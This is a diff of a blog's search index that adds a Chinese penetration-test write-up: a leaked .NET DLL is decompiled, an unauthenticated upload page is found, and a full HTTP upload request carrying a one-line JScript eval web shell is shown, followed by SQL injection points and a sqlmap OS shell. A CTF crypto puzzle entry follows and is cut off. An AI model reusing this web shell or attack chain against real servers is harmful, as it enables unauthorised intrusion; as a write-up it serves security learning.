@@ -1,7 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>NSSCrypto-03</title>
+    <title>从文件泄露代码审计到Getshell</title>
+    <url>/posts/34084a97/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某次项目中客户要求在互联网侧进行渗透测试，奈何肝了两天也没找到个高危漏洞，没办法太菜了。</p>
+<p>偶然间端口扫描后，扫目录发现了两个bin.rar，这下和客户有得交代了！！！</p>
+<p><img src="/posts/34084a97/attachment:44e7a99ce330cfea32f5c230c7afef46" alt="截图"></p>
+<p>解压后为多个dll文件，使用ILspy进行反编译Android.dll</p>
+<p><img src="/posts/34084a97/attachment:b28c7a8b861c6151c7698585278bd4a4" alt="截图"></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>开始 .net代码审计</p>
+<p><img src="/posts/34084a97/attachment:3c9ca57890e0d4e349d71f65f935dedd" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:fe40ed850486ebf0f2d9b3dc1c357c48" alt="截图"></p>
+<h3 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h3><p>代码审计后发现存在一个 log.txt 日志泄露  记录着请求日志</p>
+<p><img src="/posts/34084a97/attachment:a7549aa3e80fc0ab3d69be1e2624c919" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:f943587161a99543ff1ddf29827ebfa7" alt="截图"></p>
+<h3 id="未授权文件上传服务"><a href="#未授权文件上传服务" class="headerlink" title="未授权文件上传服务"></a>未授权文件上传服务</h3><p><img src="/posts/34084a97/attachment:a0191b334809206943e985c1bc4937e7" alt="截图"></p>
+<p>访问 <a href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  通过读源码已经给出了上传密码lk，输入密码后可以上传到人员指定目录下 <img src="/posts/34084a97/attachment:17632dd1892ace8ead003cf9f1810290" alt="截图"></p>
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><img src="/posts/34084a97/attachment:509d38a45fa843705ff62408b141322d" alt="截图"></p>
+<p>构造文件上传数据包进行fuzz  会上传到/UpPhoto 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadAndroid.aspx HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8500</span><br><span class="line">Content-Length: 345</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/34084a97/attachment:9a6f3979b3ed1f4fc58729ef68fd5130" alt="截图"></p>
+<p>上传成功连接蚁剑 getshell</p>
+<p><img src="/posts/34084a97/attachment:223a8a0ad918b603355e39182278575f" alt="截图"></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>两个泄露的dll中都存在很多sql注入，没有进行过滤处理，推测这两个端口服务均为API接口</p>
+<p><img src="/posts/34084a97/attachment:bcd43a7783572f2bbe033f11eae4c159" alt="截图"></p>
+<p>此处 strYear 未经过处理 存在sql注入  <a href="http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2">http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2</a></p>
+<p>还存在其他多处注入点</p>
+<p><img src="/posts/34084a97/attachment:80a1bc9a809680ee5ff4c28d1d0322c7" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:b7b67f26b9fe6a5a20b1d43eb12e813b" alt="截图"></p>
+<hr>
+<p>在另一处端口代码泄露中也存在多处sql注入 未经过处理的地方很多就不在列举。。。基本上strXX、XXID、year、data都可以注入</p>
+<p><img src="/posts/34084a97/attachment:7726004a2ae621cbc741025a6d4690df" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:54b1e75f113a4605e06f1decd2b8abac" alt="截图"></p>
+<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1</a></p>
+<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewList.aspx?strName=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewList.aspx?strName=1</a></p>
+<p><img src="/posts/34084a97/attachment:e77a25a383c05e1027f53e9437433517" alt="截图"></p>
+<p><img src="/posts/34084a97/attachment:d81cfd4d4948efbb491cff7993d468a9" alt="截图"></p>
+<p>sqlmap可以直接注入获取数据并os-shell</p>
+<p><img src="/posts/34084a97/attachment:37884090b974cc28b17224ae2b3d524d" alt="截图"></p>
+<p>除了以上之外 也有多处敏感信息泄露，这里便不再列举。。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>NSS Crypto-03</title>
     <url>/posts/555436f5/</url>
     <content><![CDATA[<h3 id="这是base"><a href="#这是base" class="headerlink" title="这是base??"></a>这是base??</h3><p>题目</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br><span class="line"></span><br></pre></td></tr></table></figure>
